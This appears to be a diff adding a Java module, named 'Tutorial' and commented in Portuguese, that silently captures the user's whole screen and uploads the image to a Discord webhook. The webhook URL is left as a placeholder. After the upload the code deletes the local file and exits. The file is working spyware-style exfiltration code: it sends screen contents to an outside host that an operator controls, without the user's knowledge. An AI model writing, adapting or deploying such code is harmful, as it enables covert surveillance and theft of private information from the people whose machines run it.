@@ -1,0 +1,90 @@
+package Modules;
+
+import java.awt.AWTException;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.Toolkit;
+import java.awt.image.BufferedImage;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import javax.imageio.ImageIO;
+
+public class Tutorial {
+    public static void main(String[] args) {
+        try {
+            // Captura a tela do PC
+            Robot robot = new Robot();
+            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+            BufferedImage screenshot = robot.createScreenCapture(screenRect);
+
+            // Salva a captura de tela em um arquivo temporário
+            String tempFolderPath = System.getProperty("java.io.tmpdir");
+            File outputfile = new File(tempFolderPath, "screenshot.png");
+            ImageIO.write(screenshot, "png", outputfile);
+
+            // Envia a captura de tela para o webhook do Discord
+            sendScreenshotToDiscordWebhook(outputfile);
+
+            // Exclui o arquivo após o envio ao webhook
+            outputfile.delete();
+
+            System.out.println("Screenshot da tela enviada para o Discord com sucesso!");
+
+            // Fecha o aplicativo
+            closeApplication();
+        } catch (AWTException | IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private static void sendScreenshotToDiscordWebhook(File screenshotFile) throws IOException {
+        String discordWebhookUrl = "YOUR WEBHOOK";
+
+        // Criação da conexão HTTP
+        URL url = new URL(discordWebhookUrl);
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setDoOutput(true);
+        connection.setRequestMethod("POST");
+        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---BOUNDARY");
+
+        // Criação do corpo da requisição
+        String boundary = "---BOUNDARY";
+        String attachmentName = "screenshot.png";
+        String attachmentFileName = screenshotFile.getName();
+        String lineBreak = "\r\n";
+
+        // Início do corpo da requisição
+        StringBuilder requestBodyBuilder = new StringBuilder();
+        requestBodyBuilder.append("--").append(boundary).append(lineBreak);
+        requestBodyBuilder.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(attachmentFileName).append("\"").append(lineBreak);
+        requestBodyBuilder.append("Content-Type: image/png").append(lineBreak);
+        requestBodyBuilder.append(lineBreak);
+
+        // Fim do corpo da requisição
+        String requestBody = requestBodyBuilder.toString();
+        byte[] requestBodyBytes = requestBody.getBytes();
+        byte[] lineBreakBytes = lineBreak.getBytes();
+        byte[] fileBytes = java.nio.file.Files.readAllBytes(screenshotFile.toPath());
+
+        // Envio da requisição
+        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
+        outputStream.write(requestBodyBytes);
+        outputStream.write(fileBytes);
+        outputStream.write(lineBreakBytes);
+        outputStream.write(("--" + boundary + "--").getBytes());
+        outputStream.flush();
+        outputStream.close();
+
+        // Leitura da resposta da requisição
+        int responseCode = connection.getResponseCode();
+        connection.disconnect();
+    }
+
+    private static void closeApplication() {
+        // Encerra a aplicação
+        System.exit(0);
+    }
+}
